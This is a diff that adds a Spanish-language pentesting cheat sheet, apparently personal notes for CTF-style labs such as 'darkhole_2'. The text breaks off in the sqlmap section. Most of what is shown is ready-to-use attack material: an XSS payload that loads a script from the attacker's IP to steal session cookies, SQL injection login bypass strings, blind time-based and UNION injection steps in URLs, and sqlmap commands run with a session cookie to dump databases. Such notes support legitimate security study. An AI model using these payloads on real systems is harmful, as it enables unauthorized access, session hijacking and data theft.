@@ -1,0 +1,582 @@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#++=======++#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+====++++******++==+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*===++**######%%%%###*+=+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==++**#######%%%%%%%%%%%%#++*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+=++*##########%%%%%%@@@%%%%#++%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==++#########++***###%%%@@@@%%#+=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=++*#####**+++##%@@%%####%%@@@@%#*+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=+*#####*+++*%@@@@@@@@@%%##%@@@@%#*+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++#####+++#%@@@@@@@@@@@@@@@%##%@@@%#++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++*####*++#@@@@@@@@@@@@@@@@@@@@%#%@%%%#++@ @@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@%+**###*+#%@@@@@@@@@@@@@@@@@@@@@%#%@%%##+# @@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@*+*####+#@@@@@@@@@@@@@@@@@@@@@@@@##@%%%#*+ %@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%@@@%++*###+#@@@@@@@@@@@@@@@@@@@@@@@@@@##@%%##+ #@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@%@@@@@*++###+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%%%#* +%@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@#++*##*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%%%# +#@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@+++##*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##%# ++@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@*++***%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*# #=#@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@#=+++#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+ *++%@@@@%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@@%+=++#@@@@@@@@@%@@@@@@@@@@@@@@@@@@@%#@@@@@@@@@% *++*@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@%*==+#@@@@@@@@@%=+%%@@@@@@@@@@@@@@%%*=+%@@@@@@@@@ @#==#%%@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@#=+*%@@@@@@@@@@@%+==+#%@@@@@@@@@%*===*%@@@@@@@@@@ @@%++%@@@@@%@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%#%@@@@@%=+#@@@@@@@@@@@@@@%%%%@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@%++%@%%%%%%%#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%@@%  +%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++%%%%%%####%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%+ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**%%##%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%###%*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*#%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%#+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%#+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+##%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%#+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++*##%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%##**+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+==*#%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%####+=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+*#=+#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#*+===*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@%*===+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+=======#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%%###+=+#%@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#====+++***+#@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@%%%%%%#++===*%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+==++**#######%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%####*++===#@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*==#***###%##%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@%%%%%%########++%@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#===*#####%%%%%%%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@%%%%%%%%%%#==*@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%==**+#%%%%%%%%%%%%@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@%%%%@@@%%#+#+=#@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@==+#%**%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%@%##%%#*=%@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++#%@%+%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@%@@%%#%%%#%#+%@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+#*#%@@#*%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%@@%%%%%%%@%*#@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+###%@@@%*%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%@@@%%%%@%%@@#*%@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@%+*%##%@@@@##%@%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%@@@%%%%%@%%@@%*#@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@++#%%#%@@@@%#%%%%%%%%%%%%%%%%%%@@@@%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@%%%@@@@%%%%@%%@@@@#*@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@*+#%%%%%@@@@@%%@@%%%%%%%%%%%%%%%%%%@@%@%@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@%%%@@@@%%@@@#%@@@@%*#@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@#+#%%@%%%@@@@@%%%@%%%%@@@%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@%%%@@@@@@@%%@@@@@@@@%%@@@@@@#*@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@%+*#%@@%%%@@@@@%%%@%%%%%@@@@%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@%@%@%%%%%@@@@@%%%%%@@@@@@@%@@@@@@@@@@%%@@@@@@%*%@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@#+#%%@@%%%%@@@@%%%@@%%%%@@@@@@%%%%%%%%%%%%@@%%@@@@@@@@@@@@@@@%%@%%%%%%@@@@@@%%%%@@@@@@@@%@@@@@@@@@%%@@@@@@@%##@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@**%%@@@@%%%@@@@%%@@@%%%%@@@@@@@@@%%%%%%%%%@@@%%%@@@@@@@@@%@%%%%@%%%%@@@@@@@@%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@##@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%+#%%@@@@%%%@@@@%%@@@@%%%%@@@@@@@@@@@@@%%%@@%%%%%%%%@%%@%%%%%%%@@@%@@@@@@@@@%%%@@@@@@@@@@@@@@@@@%%@@@@@@@@%#%@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@#+#%%@@@@@%%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%%%%%%%@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@@#%@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@#+*%%@@@@@@@%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%@@@%@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@%%@@@@@@@@@@@%%@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@*+*##%@@@@@@@%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@%%@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@%**##%%%@@@@@@@%%@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@%%@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@#**##%%%@@@@@@@@@%@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@%#==-==+%@@@@@@@@@@@@@@@@@%@ %%@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@%@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@####%%%%%@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@%=--------#@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@%@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@%##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=----------@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@
+@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-=*#+-=%%+-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-+%@%==@@#--%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#-----=*+------#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==----------=+=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+@%#+------+#@##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%##+++=%%@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+#*@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+Indice:
+
+1. arp-scan--------------------------------------------------------------------------------------------------------------------
+2. nmap y curl-----------------------------------------------------------------------------------------------------------------
+3. Rutas wordpress peligrosas--------------------------------------------------------------------------------------------------
+4. base 64---------------------------------------------------------------------------------------------------------------------
+5. Reconocimiento y Ataque SQL-------------------------------------------------------------------------------------------------
+6. Inyecciones SQL en URL------------------------------------------------------------------------------------------------------
+7. Inyecciones de tiempo-------------------------------------------------------------------------------------------------------
+8. SQLMAP----------------------------------------------------------------------------------------------------------------------
+9. Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa)-----------------------------------------------
+10. LOCAL FILE INCLUSION-------------------------------------------------------------------------------------------------------
+11. Wrapers--------------------------------------------------------------------------------------------------------------------
+12. Path traversal-------------------------------------------------------------------------------------------------------------
+13. Captura de pantalla--------------------------------------------------------------------------------------------------------
+14. SUBIDA DE ARCHIVOS:   (PHP INTERPRETA) + WAF-------------------------------------------------------------------------------
+15. Tratamiento TTY------------------------------------------------------------------------------------------------------------
+16. HERRAMIENTA: >>>>----GHIDRA---->-------------------------------------------------------------------------------------------
+17. Buscar info en una imagen--------------------------------------------------------------------------------------------------
+18. DIRECTORY LISTING----------------------------------------------------------------------------------------------------------
+19. NETCAT   Y   ZIP-----------------------------------------------------------------------------------------------------------
+
+
+
+1. arp-scan--------------------------------------------------------------------------------------------------------------------
+> arp-scan -I ens33 --localnet --ignoredups
+
+> ping -c 3 <IP>
+
+
+2. nmap y curl------------------------------------------------------------------------------------------------------------------
+> nmap -p- --open -sS --min-rate=5000 -vvv -n 192.168.1.137 -oG allPorts
+
+> nmap -sCV -p80 -v 192.168.1.137 -oN targeted
+
+> nmap --script http-enum -p80 192.168.1.137 -oN webScan
+
+
+
+-Ver si es vulnerable a xss:
+Send text (web):
+Comments: <script src="http://ipAtacante/test"></script>
+(Comprobar si hay alguien leyendo y clicando en los mensajes para itentar robar la cookie de sesion...)
+
+
+
+-Ver codigo fuente: Plugins..rutas..etc
+
+> curl -s -X GET "http://192.168.1.137/index.php" 
+
+
+
+
+3. Rutas wordpress peligrosas----------------------------------------------------------------------------------------------------
+WORDPRESS:
+-Probar rutas: como : /wp-admin    /wp-content/plugins    /wp-config.php    /xmlrpc.php    /robots.txt
+
+-Si tiene el xmlrpc.php activo, podemos realizar ataques.
+
+
+
+
+4. base 64---------------------------------------------------------------------------------------------------------------------
+DECODIFICAR CADENA EN BASE 64
+> echo -n "AwSADSDMFFUasidiJIJ==" | base64 -d; echo
+
+
+5. Reconocimiento y Ataque SQL-------------------------------------------------------------------------------------------------
+////////Reconocimientos con SQL:
+
+////Manual:
+
+SQL  -  LOGIN PANEL   |----[ , , , ]--->
+
+COMPROBAR USUARIOS POTENCIALES Y RESPUESTAS EN PANELS DE LOGIN:
+
+admin - admin 
+(En los Blogs suelen aparecer usuarios..probar)
+-Podriamos tratar de aplicar fuerza bruta con Burpsuite - Hydra - Wfuzz
+-Montando script en Python
+
+-O realizar ataque de SQL:
+
+Username: rmichaels' or 1=1-- -
+Password: rmichaels' or 1=1-- -
+
+(otros:)  rmichaels' and 1=1-- -
+		 
+		  rmichaels' or '1'='1     (Sin cerrar comilla para la la propia quiery la cierre por detras)
+
+		  rmichaels' and sleep(5)-- -    (Inyeccion tiempo)
+		  rmichaels and sleep(5)-- -     (Sin comilla)
+		        -En caso de que fuera de tiempo:
+		        -Para comprobar si el primer caracter de la base de datos empieza por 'a', deberia tardar 5 segundos en responder, si no fuera, cargaria rapido.
+		            rmichaels' and if(substr(database(),1,1)='a',sleep(5),1)--
+                                                        2,1   d      
+                                                        3,1   m
+                                                   ...
+                             (podemos usar un script que automatice la injeccion por tiempo:)  -> injeccion_tiempo.py
+
+
+
+
+
+6. Inyecciones SQL en URL--------------------------------------------------------------------------------------------------------------
+SQL  -  URL   |----[ , , , ]--->
+
+/////////////
+INJECCION EN URL:
+
+-En URL el ataque de injección seria:
+  G: http://<IP>/dashboard.php?id=1'      (Peta buena señal)
+  G: http://<IP>/dashboard.php?id=1' order by 2-- -
+                                              3
+                                              4
+                                              6 
+                                              7   (Peta, hay 6)
+  G: http://<IP>/dashboard.php?id=1' union select 1,2,3,4,5,6-- -  
+  G: http://<IP>/dashboard.php?id=' union select 1,2,3,4,5,6-- -    (Quito el 1)
+  G: http://<IP>/dashboard.php?id=' union select 1,database(),3,4,5,6-- -
+
+    -Podemos automatizar las inyecciones con SQLMAP
+
+7. Inyecciones de tiempo---------------------------------------------------------------------------------------------------------------
+-INJECCION DE TIEMPO:
+  G: http://<IP>/dashboard.php?id=1 and sleep(10)        (Si tarda en carga es vulnerable)
+                                    ^
+
+
+
+8. SQLMAP-----------------------------------------------------------------------------------------------------------------------------
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   
+
+
+>>>>------SQLMAP------->
+///Automatizado:-----------------------------MANERA 1  -  DESDE URL
+
+     1- Para conocer las bases de datos:
+        (Debemos tener la cookie de sesion, que la podemos ver en Storage, una vez estamso logueados en la web arrastraremos un cookie de sesion.)
+        
+            >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --batch   
+           
+         (En caso de saber que es mysql la BD, podemos indicarla):
+         
+            >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql
+            
+            
+            
+              **ESCANEO EXAUSTIVO**   (Algo mas lento)
+                    >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --dbms mysql --risk 3 --level 4      (risk 1-3;  level 1-5)
+                    
+                  
+                    
+     
+     2- Para enumerar las tablas de una BD:
+            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 --tables
+            
+     3- Para enumerar las columnas de una tabla:
